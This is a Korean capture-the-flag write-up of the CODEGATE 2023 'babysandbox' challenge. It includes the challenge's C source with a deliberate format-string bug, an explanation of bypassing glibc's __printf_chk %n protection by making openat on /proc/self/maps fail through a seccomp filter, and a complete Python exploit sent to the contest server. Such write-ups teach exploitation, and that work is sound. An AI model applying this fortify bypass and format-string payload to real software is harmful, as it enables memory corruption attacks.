---
layout: post
date: 2023-06-18
title: "CODEGATE2023 Quals babysandbox write-up"
tags: [pwnable, seccomp, FSB, ]
categories: [CTF, CODEGATE2023, ]
---


## 문제 분석


---



{% raw %}
```c
// gcc box.c -o box -no-pie

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/seccomp.h>
#include <sys/prctl.h>

#define FLAG_PATH "/flag"

int install_seccomp(uint8_t *filt, unsigned short len);
void vuln();
void read_flag();

uint32_t target = 0xdead;

int main(int argc, char **argv) {
    uint32_t filt_len;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    read(0, &filt_len, sizeof(uint32_t));
    if (filt_len > 0x200) {
        __printf_chk(1, "Too much T_T\n");
        return 1;
    }
    uint8_t *filt =  (unsigned char *)calloc(sizeof(uint8_t), filt_len);
    int res = read(0, filt, filt_len);
    if (res != filt_len) {
        __printf_chk(1, "Cannot read enough T_T\n");
        return 1;
    }

    if (install_seccomp(filt, (unsigned short)filt_len))
        return 1;

    vuln();

    return 0;
}

int install_seccomp(unsigned char *filt, unsigned short filt_len) {
    struct prog {
        unsigned short len;
        unsigned char *filt;
    } rule = {
        .len = filt_len >> 3,
        .filt = filt
    };

    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) {
        __printf_chk(1, "Failed to prctl(PR_SET_NO_NEW_PRIVS) T_T\n");
         return 1;
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &rule) < 0) { 
        __printf_chk(1, "Failed to prctl(PR_SET_SECCOMP) T_T\n");
         return 1;
    }
    return 0;
}

void vuln() {
    char input[0x100];
    memset(input, 0, sizeof(input));

    __printf_chk(1, "Let's check our mitigation ^_^\n");
    __printf_chk(1, "Protect : %p\n", &target);
    int res = read(0, input, sizeof(input) - 1);
    if (res < 0) {
        __printf_chk(1, "Functionality is broken T_T\n");
        return;
    }
    // We have a dangerous vulnerability here!
    __printf_chk(1, input);

    if (target == 0x1337) {
        __printf_chk(1, "Mitigation failed.. The flag has been exposed T_T\n");
        read_flag();
    }
    else {
        __printf_chk(1, "\nNow we are safe from memory corruption! Thank you ^_^\n");
    }
    return;
}

void read_flag() {
    int fd = open(FLAG_PATH, O_RDONLY);
    char flag_buf[0x100];

    if (fd < 0) {
        __printf_chk(1, "Failed to open flag, contact admin please T_T\n");
        exit(1);
    }

    memset(flag_buf, 0, sizeof(flag_buf));
    int res = read(fd, flag_buf, sizeof(flag_buf));

    if (res < 0) {
        __printf_chk(1, "Failed to read flag, contact admin please T_T\n");
        exit(1);        
    }
    close(fd);
    write(1, flag_buf, res);

    return;
}
```
{% endraw %}



입력 받은 seccomp 필터를 바이너리에 적용한 후에 FSB를 트리거 할 수 있게 해준다.


target을 0x1337로 변조하면 플래그를 출력해주지만, `printf_chk` 함수는 `%n`을 사용하지 못한다.


<br>


그러나 read-only 영역에서는 `%n`을 사용할 수 있으며, glibc에서는 `/proc/self/maps`를 열어 read-only 영역인지 판단한다.


<br>


`__readonly_area` 함수에서는 해당 포인터가 read-only 영역인지 확인한다. 하지만 fopen에 실패했을 경우 에러코드를 통해 해당 영역이 read-only 영역에 해당하는 지를 반환한다. 



{% raw %}
```c
int
__readonly_area (const char *ptr, size_t size)
{
  const void *ptr_end = ptr + size;

  FILE *fp = fopen ("/proc/self/maps", "rce");
  if (fp == NULL)
    {
      /* It is the system administrator's choice to not have /proc
	 available to this process (e.g., because it runs in a chroot
	 environment.  Don't fail in this case.  */
      if (errno == ENOENT
	  /* The kernel has a bug in that a process is denied access
	     to the /proc filesystem if it is set[ug]id.  There has
	     been no willingness to change this in the kernel so
	     far.  */
	  || errno == EACCES)
	return 1;
      return -1;
    }
.
.
```
{% endraw %}



{: file='sysdeps/unix/sysv/linux/readonly-area.c'}


<br>


seccomp를 통해 `openat` 시스템콜을 막고 원하는 에러코드를 반환하도록 설정할 수 있다.


한가지 주의해야할 점은 flag 파일을 읽어들일 때도 `openat` 시스템콜을 사용하므로 인자로 플래그 파일명 포인터가 넘어왔을 때는 허용해주었다.


또한 `openat` 시스템콜은 rsi를 파일명 포인터로 받으므로 `A = args[1]`로 설정해주어야 한다.



{% raw %}
```ruby
A = sys_number
A != openat ? ok : next
A = args[1]
A == 0x402147 ? ok : next
return ERRNO(2)
ok:
return ALLOW
```
{% endraw %}



이제 `%n`을 사용할 수 있으므로 FSB를 통해 값을 변조하면 된다.


## 익스플로잇


---



{% raw %}
```python
import requests
import base64 
from pwn import*

send_payload:list[bytes] = []

bpf = b"\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x04\x01\x01\x00\x00\x20\x00\x00\x00\x18\x00\x00\x00\x54\x00\x00\x00\xff\x00\x00\x00\x15\x00\x01\x00\x47\x00\x00\x00\x06\x00\x00\x00\x02\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f"
send_payload.append(p32(len(bpf)))
send_payload.append(bytes(bpf))


payload = b''
payload += b'%' + b'4856' + b'c' # 0x1337
payload += b'%d%d%d%d%d%d%d%d%d%n'
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(0x404088)
send_payload.append(payload)

result_payload = b''.join(send_payload)

res = requests.post('http://15.164.245.40:1400/', data={'payload':base64.b64encode(result_payload)})

print(res.text)
```
{% endraw %}



## 레퍼런스


---


[https://0xacb.com/2017/11/19/hxp-flag-store/](https://0xacb.com/2017/11/19/hxp-flag-store/)

